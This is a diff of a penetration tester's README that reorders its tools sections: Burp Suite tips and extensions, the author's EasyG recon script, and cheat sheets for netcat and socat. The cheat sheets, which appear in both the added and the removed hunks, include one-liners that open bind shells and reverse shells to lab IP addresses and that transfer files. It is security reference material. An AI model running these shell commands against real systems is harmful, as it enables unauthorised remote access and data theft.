@@ -28,6 +28,7 @@ EasyG started out as a script that I use to automate some information gathering 
   - [EasyG](#easyg)
   - [Netcat](#netcat)
   - [Socat](#socat)
+  - [Others](#others)
 - [Network](#network)
 - [Linux](#linux)
 - [Mobile](#mobile)
@@ -259,6 +260,91 @@ EasyG started out as a script that I use to automate some information gathering 
 
 ## Tools
 
+### <ins>Burp Suite</ins>
+
+- To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
+- [To fix visual glitches](https://forum.portswigger.net/thread/visual-glitches-within-burp-on-secondary-screen-390bebb0)
+- To add a new header
+  ```
+  1. Go to Proxy -> Options -> Match and Replace -> Add
+  2. Change Type to Request Header
+  3. As the default text says in Match 'leave blank to add a new header'
+  4. Put the new header in Replace
+  ```
+- Cool extensions:
+  - [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
+  - [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
+  - [Wsdler](https://github.com/NetSPI/Wsdler) to interact with SOAP
+  - [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
+  - [Swagger-EZ](https://github.com/RhinoSecurityLabs/Swagger-EZ)
+  - [BurpCustomizer](https://github.com/CoreyD97/BurpCustomizer)
+  - [Software Version Reporter](https://portswigger.net/bappstore/ae62baff8fa24150991bad5eaf6d4d38)
+  - [Software Vulnerability Scanner](https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb)
+  - [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
+  - [Autorize](https://github.com/PortSwigger/autorize)
+    - [Auth Analyzer](https://portswigger.net/bappstore/7db49799266c4f85866f54d9eab82c89)
+  - [Active Scan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976)
+  - [BurpJSLinkFinder](https://github.com/PortSwigger/js-link-finder)
+  - [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
+  - [AWS Security Checks](https://portswigger.net/bappstore/f078b9254eab40dc8c562177de3d3b2d)
+  - [Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
+  - [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f)
+  - [AutoRepeater](https://github.com/nccgroup/AutoRepeater)
+  - [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
+  - [GetAllParams evolution](https://github.com/xnl-h4ck3r/GAP-Burp-Extension)
+  - [Burp Bounty](https://burpbounty.net/)
+- Browser extensions:
+  - [Trufflehog Chrome Extension](https://github.com/trufflesecurity/Trufflehog-Chrome-Extension)
+  - [Wappalyzer](https://www.wappalyzer.com/)
+  - [Shodan for Chrome](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap) and [for Firefox](https://addons.mozilla.org/en-US/firefox/addon/shodan_io/)
+  - [DotGit](https://github.com/davtur19/DotGit)
+
+
+### <ins>EasyG</ins>
+
+[EasyG](easyg.rb) is a script that I use to automate some information gathering tasks for my hacking process. It uses: amass, subfinder, github-subdomains, gobuster, anew, httprobe and naabu.
+
+- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
+- [lists](lists/)
+  - [findtheevent.txt](lists/findtheevent.txt) and [findthetag.txt](lists/findthetag.txt) helps me test for XSS faster
+- [scripts](scripts/)
+  - [fg.rb](scripts/fg.rb) a copy of [tomnomnom/gf](https://github.com/tomnomnom/gf) made in ruby
+  - [nuclei_checks.rb](scripts/nuclei_checks.rb) perform some nuclei scans with a list of targets as an input
+  - [paramspider_support.rb](scripts/paramspider_support.rb) use paramspider with a list of targets as an input, delete duplicate results
+  - [selenium.rb](scripts/selenium.rb) take screenshots from a list of targets as an input
+  - [zip.py](scripts/zip.py) create custom zip files
+- [shells](shells/) to test file uploads
+
+
+### <ins>Netcat</ins>
+
+```
+nc -nv 10.11.0.22 110                                                        Connect to a TCP port
+nc -nlvp 4444                                                                Set up a listener
+nc -nv 10.11.0.22 4444                                                       Connect to a listener
+nc -nlvp 4444 > incoming.exe                                                 Receive a file
+nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
+nc -nlvp 4444 -e cmd.exe                                                     Set up a bind shell
+nc -nv 10.11.0.22 4444 -e /bin/bash                                          Send a reverse shell
+```
+
+
+### <ins>Socat</ins>
+
+```
+socat - TCP4:<remote server's ip address>:80                                 Connect to a remote server on port 80
+socat TCP4-LISTEN:443 STDOUT                                                 Create a listener
+socat -d -d TCP4-LISTEN:443 STDOUT                                           Create a listener, -d -d for more verbosity
+socat TCP4-LISTEN:443,fork file:secret.txt                                   Transfer a file
+socat TCP4:10.11.0.4:443 file:received_secret.txt,create                     Receive a file
+socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     Send a reverse shell
+socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
+socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
+```
+
+
+### <ins>Others</ins>
+
 **For a temporary public server**
 - [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/)
 - [beeceptor](https://beeceptor.com/)
@@ -318,7 +404,7 @@ EasyG started out as a script that I use to automate some information gathering 
 - [PlexTrac](https://plextrac.com/)
 
 
-**Other**
+**Misc tools**
 - [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
 - [base64encode.org](https://www.base64encode.org/)
 - [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
@@ -327,89 +413,6 @@ EasyG started out as a script that I use to automate some information gathering 
 - [USB Rubber Ducky](https://shop.hak5.org/products/usb-rubber-ducky)
 - [Flipper Zero](https://flipperzero.one/)
 - [Create a random text file](https://onlinefiletools.com/generate-random-text-file)
-
-
-### <ins>Burp Suite</ins>
-
-- To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`
-- [To fix visual glitches](https://forum.portswigger.net/thread/visual-glitches-within-burp-on-secondary-screen-390bebb0)
-- To add a new header
-  ```
-  1. Go to Proxy -> Options -> Match and Replace -> Add
-  2. Change Type to Request Header
-  3. As the default text says in Match 'leave blank to add a new header'
-  4. Put the new header in Replace
-  ```
-- Cool extensions:
-  - [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
-  - [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
-  - [Wsdler](https://github.com/NetSPI/Wsdler) to interact with SOAP
-  - [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
-  - [Swagger-EZ](https://github.com/RhinoSecurityLabs/Swagger-EZ)
-  - [BurpCustomizer](https://github.com/CoreyD97/BurpCustomizer)
-  - [Software Version Reporter](https://portswigger.net/bappstore/ae62baff8fa24150991bad5eaf6d4d38)
-  - [Software Vulnerability Scanner](https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb)
-  - [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
-  - [Autorize](https://github.com/PortSwigger/autorize)
-    - [Auth Analyzer](https://portswigger.net/bappstore/7db49799266c4f85866f54d9eab82c89)
-  - [Active Scan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976)
-  - [BurpJSLinkFinder](https://github.com/PortSwigger/js-link-finder)
-  - [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
-  - [AWS Security Checks](https://portswigger.net/bappstore/f078b9254eab40dc8c562177de3d3b2d)
-  - [Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
-  - [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f)
-  - [AutoRepeater](https://github.com/nccgroup/AutoRepeater)
-  - [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
-  - [GetAllParams evolution](https://github.com/xnl-h4ck3r/GAP-Burp-Extension)
-  - [Burp Bounty](https://burpbounty.net/)
-- Browser extensions:
-  - [Trufflehog Chrome Extension](https://github.com/trufflesecurity/Trufflehog-Chrome-Extension)
-  - [Wappalyzer](https://www.wappalyzer.com/)
-  - [Shodan for Chrome](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap) and [for Firefox](https://addons.mozilla.org/en-US/firefox/addon/shodan_io/)
-  - [DotGit](https://github.com/davtur19/DotGit)
-
-
-
-### <ins>EasyG</ins>
-
-[EasyG](easyg.rb) is a script that I use to automate some information gathering tasks for my hacking process. It uses: amass, subfinder, github-subdomains, gobuster, anew, httprobe and naabu.
-
-- [XSS all the things](XSS%20all%20the%20things/) some payloads to find XSS in various places
-- [lists](lists/)
-  - [findtheevent.txt](lists/findtheevent.txt) and [findthetag.txt](lists/findthetag.txt) helps me test for XSS faster
-- [scripts](scripts/)
-  - [fg.rb](scripts/fg.rb) a copy of [tomnomnom/gf](https://github.com/tomnomnom/gf) made in ruby
-  - [nuclei_checks.rb](scripts/nuclei_checks.rb) perform some nuclei scans with a list of targets as an input
-  - [paramspider_support.rb](scripts/paramspider_support.rb) use paramspider with a list of targets as an input, delete duplicate results
-  - [selenium.rb](scripts/selenium.rb) take screenshots from a list of targets as an input
-  - [zip.py](scripts/zip.py) create custom zip files
-- [shells](shells/) to test file uploads
-
-
-### <ins>Netcat</ins>
-
-```
-nc -nv 10.11.0.22 110                                                        Connect to a TCP port
-nc -nlvp 4444                                                                Set up a listener
-nc -nv 10.11.0.22 4444                                                       Connect to a listener
-nc -nlvp 4444 > incoming.exe                                                 Receive a file
-nc -nv 10.11.0.22 4444 < /usr/share/windows-resources/binaries/wget.exe      Transfer a file
-nc -nlvp 4444 -e cmd.exe                                                     Set up a bind shell
-nc -nv 10.11.0.22 4444 -e /bin/bash                                          Send a reverse shell
-```
-
-### <ins>Socat</ins>
-
-```
-socat - TCP4:<remote server's ip address>:80                                 Connect to a remote server on port 80
-socat TCP4-LISTEN:443 STDOUT                                                 Create a listener
-socat -d -d TCP4-LISTEN:443 STDOUT                                           Create a listener, -d -d for more verbosity
-socat TCP4-LISTEN:443,fork file:secret.txt                                   Transfer a file
-socat TCP4:10.11.0.4:443 file:received_secret.txt,create                     Receive a file
-socat TCP4:10.11.0.22:443 EXEC:/bin/bash                                     Send a reverse shell
-socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash    Create an encrypted bind shell
-socat - OPENSSL:10.11.0.4:443,verify=0                                       Connect to an encrypted bind shell
-```
 
 
 ## Network
